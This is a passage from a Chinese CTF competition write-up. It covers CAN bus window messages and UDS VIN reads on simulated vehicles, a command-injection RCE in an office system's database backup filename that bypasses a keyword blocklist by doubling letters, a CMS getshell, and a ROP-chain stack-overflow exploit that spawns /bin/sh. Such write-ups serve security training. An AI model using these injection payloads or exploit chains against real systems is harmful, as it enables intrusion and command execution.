title="车窗报文获取"></a>车窗报文获取</h3><blockquote><p>操作虚拟车辆，尝试获取车窗状态报文ID（例如车窗的状态报文ID为0x123，则提交123），提交到平台（格式:dk_flag{十六进制消息ID}）。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">83</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">64</span> <span class="token number">64</span> 00 00 00 00 .ddd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">87</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">3.572785</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">46</span> <span class="token number">64</span> 00 00 00 00 .dFd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>06 delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">2.231212</span>   <span class="token number">91</span>  00 <span class="token number">64</span> 1E <span class="token number">64</span> 00 00 00 00 .d.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">80</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 00 00 <span class="token number">64</span> 00 00 00 00 <span class="token punctuation">..</span>.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>dk_flag&#123;091&#125;</code></p><h3 id="车窗控制"><a href="#车窗控制" class="headerlink" title="车窗控制"></a>车窗控制</h3><blockquote><p>操作虚拟车辆，获取车窗状态报文，逆向分析报文协议，通过逆向结果尝试构造左前车窗升起30%，左后升起50%，右前车窗升起70%，右后车窗升起30%的报文，通过CAN ID 0x11发送该构造好的报文到仿真车辆，可通过虚拟车辆仪表页面验证构造结果。假如构造的报文是cansend can0  011#01010101，则提交01010101，提到平台（格式:dk_flag{报文}）</p></blockquote><p>四个十六进制位依次代表：左前 右前 左后 右后</p><p>开启是0x00，关闭是0x64</p><p>那么升起30%是0x1E，升起50%是0x32，升起70%是0x46</p><p>flag：<code>dk_flag&#123;1E46321E&#125;</code></p><hr><h2 id="OBD2"><a href="#OBD2" class="headerlink" title="OBD2"></a>OBD2</h2><h3 id="车辆VIN读取"><a href="#车辆VIN读取" class="headerlink" title="车辆VIN读取"></a>车辆VIN读取</h3><blockquote><p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试篡改改这辆车的VIN码，他想先获取下当前车辆的VIN码。通过查询手册，他构造了730#0322F190这样一个报文来读取车辆的VIN，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的VIN字符串，提交到平台（格式:dk_flag{VIN字符串}）。</p></blockquote><p>发送报文，另一边抓包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">730</span><span class="token comment">#0322F190</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110094112861.png" alt="image-20250110094112861"></p><p><code>candump can1</code>下来看具体的十六进制包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">can1  <span class="token number">730</span>   <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>  03 <span class="token number">22</span> F1 <span class="token number">90</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">10</span> <span class="token number">14</span> <span class="token number">62</span> F1 <span class="token number">90</span> <span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">21</span> 5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">22</span> <span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考：</p><p><a href="https://www.iodraw.com/blog/221207386">https://www.iodraw.com/blog/221207386</a></p><p><a href="https://blog.csdn.net/qq_40242571/article/details/120756736">https://blog.csdn.net/qq_40242571/article/details/120756736</a></p><p>VIN码一般是17位的，取出其中的有效响应数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span><span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解码即可得到VIN码</p><p>flag：<code>dk_flag&#123;WYUZA1S2FEDK00001&#125;</code></p><h3 id="车辆故障数量读取"><a href="#车辆故障数量读取" class="headerlink" title="车辆故障数量读取"></a>车辆故障数量读取</h3><blockquote><p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试读取当前车辆故障数量。通过查询手册，他构造了710#03190103这样一个报文来读取车辆的故障数量，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的故障数量，提交到平台（格式:dk_flag{故障数量}）。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">710</span><span class="token comment">#03190103</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110095040842.png" alt="image-20250110095040842"></p><p>猜测是718上的某位数字</p><p>flag：<code>dk_flag&#123;2&#125;</code></p><hr><h1 id="信创安全挑战区"><a href="#信创安全挑战区" class="headerlink" title="信创安全挑战区"></a>信创安全挑战区</h1><h2 id="misc-入侵流量监测"><a href="#misc-入侵流量监测" class="headerlink" title="misc-入侵流量监测"></a>misc-入侵流量监测</h2><p>date，爆破8位日期即可</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109100514281.png" alt="image-20250109100514281"></p><hr><h2 id="web-国产办公软件漏洞利用"><a href="#web-国产办公软件漏洞利用" class="headerlink" title="web-国产办公软件漏洞利用"></a>web-国产办公软件漏洞利用</h2><p>data\backup\2025-01-03_MD4zU</p><p>后台admin账密</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_cache_user_detail<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&#123;\"uid\":\"1\",\"username\":\"admin\",\"isadministrator\":\"1\",\"deptid\":\"0\",\"positionid\":\"0\",\"roleid\":\"0\",\"upuid\":\"0\",\"groupid\":\"0\",\"jobnumber\":\"\",\"realname\":\"\\u8d85\\u7ea7\\u7ba1\\u7406\\u5458\",\"password\":\"bc3bc521c972d39d1e5748598987c77f\",\"gender\":\"1\",\"weixin\":\"\",\"mobile\":\"11111111111\",\"email\":\"\",\"status\":\"0\",\"createtime\":\"1735912196\",\"credits\":\"0\",\"newcomer\":\"1\",\"salt\":\"a8AZi8\",\"validationemail\":\"0\",\"validationmobile\":\"0\",\"lastchangepass\":\"0\",\"guid\":\"5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD\",\"birthday\":\"0\",\"telephone\":\"\",\"address\":\"\",\"qq\":\"\",\"bio\":\"\",\"remindsetting\":\"\",\"avatar_big\":\"data\\/avatar\\/noavatar_big.jpg\",\"avatar_middle\":\"data\\/avatar\\/noavatar_middle.jpg\",\"avatar_small\":\"data\\/avatar\\/noavatar_small.jpg\",\"bg_big\":\"data\\/home\\/nobg_big.jpg\",\"bg_middle\":\"\",\"bg_small\":\"data\\/home\\/nobg_small.jpg\",\"group_title\":\"\",\"level\":1,\"upgrade_percent\":0,\"next_group_credit\":0,\"alldeptid\":\"0\",\"deptname\":\"\",\"posname\":\"\",\"allposid\":\"\",\"rolename\":\"\",\"allroleid\":\"\",\"space_url\":\"?r=user\\/home\\/index&amp;uid=1\"&#125;'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码md5解不出来</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_user<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'超级管理员'</span><span class="token punctuation">,</span><span class="token string">'bc3bc521c972d39d1e5748598987c77f'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'11111111111'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1735912196</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a8AZi8'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜一下找到加密逻辑，是两次<code>md5(md5($pass),$salt)</code></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113138639.png" alt="image-20250109113138639"></p><p>测出来密码是123456</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113251988.png" alt="image-20250109113251988"></p><p>原来是默认密码</p><p>然后就进后台了，接下来参考：<a href="https://xz.aliyun.com/t/9115">https://xz.aliyun.com/t/9115</a></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113955181.png" alt="image-20250109113955181"></p><p>抓包</p><p>漏洞点在：system\core\utils\Database.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$backupFileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.sql'</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dumpFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqlBin</span> <span class="token operator">=</span> <span class="token variable">$mysqlBase</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$mysqlBase</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'bin/'</span><span class="token punctuation">;</span><span class="token variable">$command1</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--skip-opt --create-options'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'-all'</span><span class="token punctuation">;</span><span class="token variable">$command2</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extendins'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--extended-insert'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command3</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$sqlCompat</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'MYSQL40'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--compatible=mysql40'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"--port=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"--socket=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span><span class="token variable">$command5</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$command4</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//这。。。是黑科技</span><span class="token string backtick-quoted-string">`&#123;$mysqlBin&#125;mysqldump --force --quick &#123;$command1&#125; --add-drop-table &#123;$command2&#125; &#123;$command3&#125; --host="&#123;$db['host']&#125;" &#123;$command5&#125; --user="&#123;$db['username']&#125;" --password="&#123;$db['password']&#125;" "&#123;$db['dbname']&#125;" &#123;$tablesstr&#125; > &#123;$dumpFile&#125;`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>向上跟踪</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// --- 备份文件夹及备份文件名 ---</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name static-context">File</span><span class="token operator">::</span><span class="token function">makeDir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'head'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'less'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filename这样ban，替换函数的话双写绕过即可</p><p>再往上看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 检查导出名字</span><span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasDangerFileName</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.)(exe|jsp|asp|aspx|cgi|fcgi|pl)(\.|$)/i'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fileName</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$hasDangerFileName</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'msg'</span> <span class="token operator">=></span> <span class="token class-name static-context">Ibos</span><span class="token operator">::</span><span class="token function">lang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Database export filename invalid'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dashboard.default'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样ban的话写马太困难，但是依旧可以直接执行命令</p><p>构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">backuptype<span class="token operator">=</span>all<span class="token operator">&amp;</span>custom_enabled<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>shell<span class="token operator">&amp;</span>sizelimit<span class="token operator">=</span><span class="token number">2048</span><span class="token operator">&amp;</span>extendins<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>sqlcompat<span class="token operator">=</span><span class="token constant">MYSQL41</span><span class="token operator">&amp;</span>sqlcharset<span class="token operator">=</span>utf8<span class="token operator">&amp;</span>usehex<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>usezip<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token number">2021</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>llss<span class="token operator">></span><span class="token number">111</span><span class="token operator">%</span><span class="token number">262021</span><span class="token operator">&amp;</span>dbSubmit<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109114700372.png" alt="image-20250109114700372"></p><p>web根目录下访问可以带出回显内容</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109140751067.png" alt="image-20250109140751067"></p><p>改成 <code>cacatt f12g.txt</code> 就能读取flag了</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109141001775.png" alt="image-20250109141001775"></p><p>怎么 f12g.txt 就在web目录，这下知道前几血怎么做的了</p><hr><h2 id="web-国产业务系统隐患排查"><a href="#web-国产业务系统隐患排查" class="headerlink" title="web-国产业务系统隐患排查"></a>web-国产业务系统隐患排查</h2><p>流量包分析出后台密码</p><p>然后是一个蝉知7.7，getshell的方式在 NSS GKCTF2021 easycms 中亦有记载：<a href="https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms">https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms</a></p><p>简单提个权拿flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2.7 <span class="token parameter variable">-c</span> <span class="token string">'print(open(\"/flag.txt\").read())'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109112822712.png" alt="image-20250109112822712"></p><hr><h2 id="pwn-snake"><a href="#pwn-snake" class="headerlink" title="pwn-snake"></a>pwn-snake</h2><p>dword_6BD3F0 是分数</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114712153.png" alt="image-20250110114712153"></p><p>打2分输入q退出后进入 sub_401427</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114648914.png" alt="image-20250110114648914"></p><p>v1接收输入，那么这里v3存在栈溢出，偏移0x70+0x8</p><p>sub_40117D 是base64解码</p><p>于是用 ROPgadget 生成payload打栈溢出，加上偏移量后base64编码payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">></span> exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004005af</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004006a6</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span 